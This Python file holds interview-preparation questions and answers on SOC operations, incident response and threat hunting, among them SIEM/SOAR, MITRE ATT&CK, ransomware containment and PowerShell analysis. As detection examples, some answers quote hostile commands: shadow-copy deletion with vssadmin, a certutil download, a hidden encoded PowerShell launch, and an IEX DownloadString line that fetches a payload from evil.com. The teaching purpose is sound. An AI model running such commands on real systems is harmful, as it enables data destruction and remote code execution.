"""
SOC, Incident Response & Threat Hunting Interview Preparation Questions & Answers
Format: (Question, Crisp Answer with Key Characteristics and Example)
"""

qa_soc_ir = [
    (
        "What is the difference between a SIEM and a SOAR platform in a Modern SOC?",
        "**Direct Answer:** A SIEM (Security Information and Event Management) aggregates, correlates, and analyzes security log telemetry from across the enterprise to generate detection alerts, whereas a SOAR (Security Orchestration, Automation, and Response) takes those alerts and executes automated playbooks and workflows to contain threats at machine speed.\n\n"
        "**Key Characteristics:**\n"
        "• SIEM focuses on ingestion, indexing, compliance log retention, and detection rule correlation (e.g. Splunk, Microsoft Sentinel).\n"
        "• SOAR focuses on playbook orchestration, API integrations with firewalls/EDR, case management, and repetitive task automation (e.g. Cortex XSOAR, Splunk SOAR).\n"
        "• SOAR reduces Mean Time to Respond (MTTR) and mitigates analyst alert fatigue by automating Tier-1 triaging.\n\n"
        "**Example:** A SIEM triggers a high-severity alert for multiple failed logins followed by an anomalous geographical login; the SOAR immediately executes a playbook that disables the Active Directory user, isolates the workstation via EDR, and sends a Slack verification prompt to the user."
    ),
    (
        "What is the MITRE ATT&CK Framework and how is it used by SOC teams?",
        "**Direct Answer:** MITRE ATT&CK (Adversarial Tactics, Techniques, and Common Knowledge) is a globally accessible, curated knowledge base of real-world adversary behaviors organized into a matrix of tactical goals (why) and specific techniques (how).\n\n"
        "**Key Characteristics:**\n"
        "• Structured as Tactics (e.g., Initial Access, Persistence, Privilege Escalation) and Techniques/Sub-techniques (e.g., T1059.001 PowerShell).\n"
        "• Provides a common lexicon for SOC analysts, threat intelligence teams, red teams, and detection engineers.\n"
        "• Used for detection coverage heat-mapping, gap analysis, and simulating adversary TTPs.\n\n"
        "**Example:** When mapping SOC detection rules against MITRE ATT&CK, the team notices 0% detection coverage for 'Credential Dumping' (T1003); they subsequently deploy Sysmon Event ID 10 rules to monitor `lsass.exe` memory access."
    ),
    (
        "What are the 7 stages of the Cyber Kill Chain and how does defense-in-depth apply?",
        "**Direct Answer:** Developed by Lockheed Martin, the Cyber Kill Chain outlines the sequential phases of a targeted external cyberattack: Reconnaissance, Weaponization, Delivery, Exploitation, Installation, Command and Control (C2), and Actions on Objectives.\n\n"
        "**Key Characteristics:**\n"
        "• Sequential model: Breaking any single link in the chain disrupts and neutralizes the entire adversary operation.\n"
        "• Shifts security posture from reactive post-breach response to proactive multi-layer perimeter and endpoint interception.\n"
        "• Early-stage interception (Delivery/Exploitation) carries substantially lower remediation cost than late-stage interception (Actions on Objectives).\n\n"
        "**Example:** An attacker crafts a weaponized macro document (Weaponization) and emails it to HR (Delivery); email gateway sandbox filters quarantine the attachment, terminating the Kill Chain before Exploitation can begin."
    ),
    (
        "What is the difference between EDR and XDR?",
        "**Direct Answer:** EDR (Endpoint Detection and Response) continuously monitors and records host-level activities (process execution, file modifications, network connections) to detect and isolate threats on endpoints, while XDR (Extended Detection and Response) unifies telemetry across endpoints, network, cloud workloads, email, and identity systems into a single contextual investigation engine.\n\n"
        "**Key Characteristics:**\n"
        "• EDR provides granular endpoint visibility, memory inspection, host isolation, and live response terminals (e.g. CrowdStrike Falcon, Microsoft Defender for Endpoint).\n"
        "• XDR correlates multi-vector telemetry, breaking down data silos between firewalls, email gateways, cloud environments, and endpoints.\n"
        "• XDR provides end-to-end attack timeline reconstruction across multiple domains automatically.\n\n"
        "**Example:** An attacker breaches an email account (Email vector), downloads a reverse shell on a laptop (EDR vector), and attempts lateral movement to an AWS S3 bucket (Cloud vector); XDR stitches all three disparate events into a single cohesive incident."
    ),
    (
        "How do you investigate and contain an active Ransomware outbreak on an enterprise host?",
        "**Direct Answer:** Immediate response requires isolating the infected host from the network (via EDR or physical disconnect), capturing volatile memory for forensic analysis, identifying the patient-zero infection vector, and revoking compromised credentials before initiating clean system restoration.\n\n"
        "**Key Characteristics:**\n"
        "• Containment first: Isolate host at network level (do not power off or reboot, preserving volatile RAM and encryption keys).\n"
        "• Identify processes creating anomalous high-frequency file renames/extensions (`.locked`, `.crypted`) and kill malicious process trees.\n"
        "• Inspect VSS (Volume Shadow Copies) deletion commands (`vssadmin delete shadows /all /quiet`) and lateral SMB propagation.\n\n"
        "**Example:** A SOC analyst notices `vssadmin.exe` executed by an unknown binary; they immediately click 'Network Contain' in the EDR console, pull a triage memory dump via Live Response, and block the ransomware's external C2 IP on enterprise border firewalls."
    ),
    (
        "What is Threat Hunting and how does it differ from reactive SOC alert triaging?",
        "**Direct Answer:** Threat Hunting is a proactive, hypothesis-driven analytical process where security defenders search through networks and endpoints to detect stealthy, persistent threats that have successfully bypassed automated security controls.\n\n"
        "**Key Characteristics:**\n"
        "• Driven by an 'Assume Breach' mindset rather than waiting for an automated alert to fire.\n"
        "• Formulates hypotheses using cyber threat intelligence (CTI), newly disclosed zero-days, or anomalous baseline behaviors.\n"
        "• Leads to creation of permanent new automated detection rules and closes architectural blind spots.\n\n"
        "**Example:** Instead of reviewing alerts, a threat hunter hypothesizes: 'Adversaries may be using LOLBAS binaries like `certutil.exe` to download payloads.' They query SIEM logs for `certutil -urlcache -split -f` and uncover an undetected unauthorized script."
    ),
    (
        "What is the Pyramid of Pain and why are TTPs at the top?",
        "**Direct Answer:** David Bianco's Pyramid of Pain illustrates the amount of difficulty that a defender inflicts on an adversary by taking away specific classes of indicators, ranging from trivial (Hash Values) at the base to tough/fatal (TTPs - Tactics, Techniques & Procedures) at the apex.\n\n"
        "**Key Characteristics:**\n"
        "• Hash values (Trivial) & IP Addresses (Easy): Adversaries can change hashes by altering a single byte, and rotate IPs instantly with proxies.\n"
        "• Domain Names (Simple) & Network/Host Artifacts (Annoying): Requires changing DNS configs or recompiling code.\n"
        "• TTPs (Tough): Represents the adversary's human habits, tradecraft, and toolkits; disrupting TTPs forces them to reinvent their entire operational methodology.\n\n"
        "**Example:** Blocking an attacker's file hash does not stop them because they recompile with new metadata in 3 seconds; detecting their technique of injecting shellcode into `svchost.exe` renders their attack toolchain useless regardless of file hash."
    ),
    (
        "What is the difference between Indicators of Compromise (IoCs) and Indicators of Attack (IoAs)?",
        "**Direct Answer:** Indicators of Compromise (IoCs) are forensic evidence or forensic artifacts that an attack has *already* taken place in the past, whereas Indicators of Attack (IoAs) focus on the real-time intent and behavioral mechanics of what an attacker is trying to accomplish right now.\n\n"
        "**Key Characteristics:**\n"
        "• IoCs are retrospective and static: SHA256 hashes, malicious C2 IP addresses, suspicious domain names, registry keys.\n"
        "• IoAs are proactive and behavioral: unquoted service path execution, code injection into legitimate processes, anomalous volume shadow copy deletions.\n"
        "• IoAs allow defenders to stop zero-day attacks where no known IoC hash or signature exists.\n\n"
        "**Example:** An IoC is discovering a known Cobalt Strike beacon hash on a hard drive; an IoA is detecting Microsoft Word spawning `powershell.exe` with hidden window flags (`-w hidden -enc`), which signals malicious intent regardless of the hash."
    ),
    (
        "What are the key phases of the NIST SP 800-61 Incident Handling Guide?",
        "**Direct Answer:** NIST SP 800-61 defines four sequential and cyclical phases for enterprise incident management: 1. Preparation, 2. Detection & Analysis, 3. Containment, Eradication & Recovery, and 4. Post-Incident Activity (Lessons Learned).\n\n"
        "**Key Characteristics:**\n"
        "• Preparation: establishing incident handling playbooks, forensic tools, jump-bags, and communication plans.\n"
        "• Detection & Analysis: triaging alerts, scoping breadth of compromise, and confirming true positive incidents.\n"
        "• Containment (Short-term/Long-term), Eradication (clean malware/backdoors), and Recovery (restore from verified backups).\n"
        "• Lessons Learned: root cause analysis, evidence retention, and updating detection engineering rules.\n\n"
        "**Example:** Following a credential-stuffing attack, the SOC contains the incident by terminating active sessions, eradicates persistence by forcing password resets and rotating API keys, and updates playbooks with automated IP-reputation blocking (Lessons Learned)."
    ),
    (
        "How do you analyze suspicious or obfuscated PowerShell activity on a Windows system?",
        "**Direct Answer:** Suspicious PowerShell activity is analyzed by enabling and inspecting Script Block Logging (Event ID 4104), Module Logging (Event ID 4103), and Transcription Logs, specifically decoding Base64 encoded commands (`-e` or `-enc`) and inspecting execution bypass flags.\n\n"
        "**Key Characteristics:**\n"
        "• Look for evasion flags: `-ExecutionPolicy Bypass`, `-WindowStyle Hidden`, `-NoProfile`, `-NonInteractive`.\n"
        "• Script Block Logging (4104) captures the full de-obfuscated script content at runtime right before execution in the .NET CLR.\n"
        "• Base64 decoded commands frequently reveal `DownloadString`, `IEX` (Invoke-Expression), or reflective DLL loaders.\n\n"
        "**Example:** Sysmon Event ID 1 captures `powershell.exe -enc SQBFAFgA...`; decoding the UTF-16LE Base64 string uncovers `IEX (New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1')`, revealing the stage-2 payload source."
    ),
    (
        "What is the Diamond Model of Intrusion Analysis and how does it assist threat attribution?",
        "**Direct Answer:** The Diamond Model is a framework for analyzing cyber intrusions by mapping every incident to four core interrelated vertices: Adversary, Capability, Infrastructure, and Victim, supplemented by socio-political motives and technological axes.\n\n"
        "**Key Characteristics:**\n"
        "• Adversary: Threat actor group or sponsor (e.g. APT29, FIN7).\n"
        "• Capability: Tools, malware, exploits, or techniques utilized by the actor.\n"
        "• Infrastructure: Command and control servers, bulletproof hosting, IP addresses, domains.\n"
        "• Victim: Target organization, industry sector, specific individuals, or data assets.\n\n"
        "**Example:** When a healthcare organization (Victim) suffers a breach involving Cobalt Strike with a unique watermark (Capability) communicating with a specific fast-flux ASN (Infrastructure), analysts correlate these nodes to attribute the attack to an extortion gang."
    ),
    (
        "What is Alert Fatigue and what strategies do SOC managers use to mitigate it?",
        "**Direct Answer:** Alert Fatigue is the psychological exhaustion experienced by SOC analysts when overwhelmed by a high volume of low-fidelity, redundant, or false-positive security alerts, leading to missed critical breaches.\n\n"
        "**Key Characteristics:**\n"
        "• Solved by continuous detection engineering and alert tuning (e.g. whitelisting authorized vulnerability scanner IPs).\n"
        "• Deploying SOAR playbooks to automatically triage, deduplicate, and enrich repetitive low-severity alerts.\n"
        "• Shifting from single-event alerts to risk-based alerting (RBA), which only triggers when multiple correlated suspicious events exceed a threshold on an entity.\n\n"
        "**Example:** A SOC receives 3,000 firewall port scan alerts daily; the team implements an automated SOAR playbook that checks external IP reputation on VirusTotal, auto-closing low-risk noise and reducing Tier-1 queue volume by 78%."
    )
]
